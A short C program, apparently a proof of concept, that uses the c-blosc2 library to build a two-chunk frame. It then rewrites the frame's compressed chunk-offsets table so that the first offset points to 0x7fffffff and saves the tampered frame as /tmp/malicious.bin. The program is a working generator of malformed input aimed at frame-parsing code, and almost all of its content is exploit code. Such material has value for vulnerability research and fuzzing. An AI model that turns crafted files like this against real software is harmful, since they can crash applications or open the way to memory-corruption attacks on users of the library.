#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <blosc2.h>

#define FRAME_HEADER_LEN 11
#define FRAME_LEN 16
#define FRAME_NBYTES 30
#define FRAME_CBYTES 39
#define FRAME_TYPESIZE 48
#define FRAME_CHUNKSIZE 53

static int32_t sw32(const uint8_t* p) {
  return (int32_t)(p[0] | (p[1]<<8) | (p[2]<<16) | ((uint32_t)p[3]<<24));
}
static int64_t sw64(const uint8_t* p) {
  return (int64_t)((uint64_t)p[0] | ((uint64_t)p[1]<<8) | ((uint64_t)p[2]<<16) | ((uint64_t)p[3]<<24) |
         ((uint64_t)p[4]<<32) | ((uint64_t)p[5]<<40) | ((uint64_t)p[6]<<48) | ((uint64_t)p[7]<<56));
}

int main() {
  blosc_init();
  blosc2_cparams cparams = BLOSC2_CPARAMS_DEFAULTS;
  cparams.clevel = 5;
  cparams.compcode = BLOSC_BLOSCLZ;
  cparams.typesize = 4;
  blosc2_storage storage;
  memset(&storage, 0, sizeof(storage));
  storage.sequential = true;
  storage.cparams = &cparams;
  blosc2_schunk* schunk = blosc2_schunk_new(storage);
  int32_t data[100];
  for (int i=0;i<100;i++) data[i]=i;
  blosc2_schunk_append_buffer(schunk, data, sizeof(data));
  blosc2_schunk_append_buffer(schunk, data, sizeof(data));
  uint8_t* sframe;
  int64_t len = blosc2_schunk_to_sframe(schunk, &sframe);
  printf("frame len %lld\n", (long long)len);

  int32_t header_len = sw32(sframe + FRAME_HEADER_LEN);
  int64_t nbytes = sw64(sframe + FRAME_NBYTES);
  int64_t cbytes = sw64(sframe + FRAME_CBYTES);
  int32_t chunksize = sw32(sframe + FRAME_CHUNKSIZE);
  int32_t nchunks = (int32_t)(nbytes / chunksize);
  if (nbytes % chunksize > 0) nchunks++;
  printf("header_len=%d nbytes=%lld cbytes=%lld chunksize=%d nchunks=%d\n",
         header_len, (long long)nbytes, (long long)cbytes, chunksize, nchunks);

  uint8_t* coffsets = sframe + header_len + cbytes;
  size_t coffsets_cbytes = len - (header_len + cbytes) - 30;
  printf("coffsets at offset %d, cbytes=%zu\n", header_len + (int)cbytes, coffsets_cbytes);

  int64_t* offsets = malloc(nchunks * 8);
  blosc2_dparams dparams = BLOSC2_DPARAMS_DEFAULTS;
  blosc2_context* dctx = blosc2_create_dctx(dparams);
  int32_t off_nbytes = blosc2_decompress_ctx(dctx, coffsets, coffsets_cbytes, offsets, nchunks * 8);
  blosc2_free_ctx(dctx);
  printf("decompressed offsets: %d bytes\n", off_nbytes);
  for (int i = 0; i < nchunks; i++) {
    printf("  offset[%d] = %lld\n", i, (long long)offsets[i]);
  }

  offsets[0] = 0x7fffffff;

  uint8_t* new_off_chunk = malloc(nchunks * 8 + BLOSC_MAX_OVERHEAD);
  blosc2_cparams off_cparams = BLOSC2_CPARAMS_DEFAULTS;
  off_cparams.typesize = 8;
  blosc2_context* cctx = blosc2_create_cctx(off_cparams);
  int32_t new_off_cbytes = blosc2_compress_ctx(cctx, offsets, nchunks * 8, new_off_chunk, nchunks * 8 + BLOSC_MAX_OVERHEAD);
  blosc2_free_ctx(cctx);
  printf("new offsets chunk cbytes: %d\n", new_off_cbytes);

  int64_t new_len = header_len + cbytes + new_off_cbytes + 30;
  uint8_t* new_frame = malloc(new_len);
  memcpy(new_frame, sframe, header_len + cbytes);
  memcpy(new_frame + header_len + cbytes, new_off_chunk, new_off_cbytes);
  memcpy(new_frame + FRAME_LEN, &new_len, 8);
  memcpy(new_frame + header_len + cbytes + new_off_cbytes, sframe + len - 30, 30);

  FILE* f = fopen("/tmp/malicious.bin", "wb");
  fwrite(new_frame, 1, new_len, f);
  fclose(f);
  printf("wrote %lld bytes to /tmp/malicious.bin\n", (long long)new_len);

  free(offsets);
  free(new_off_chunk);
  free(new_frame);
  blosc2_schunk_free(schunk);
  blosc_destroy();
  return 0;
}
EOF
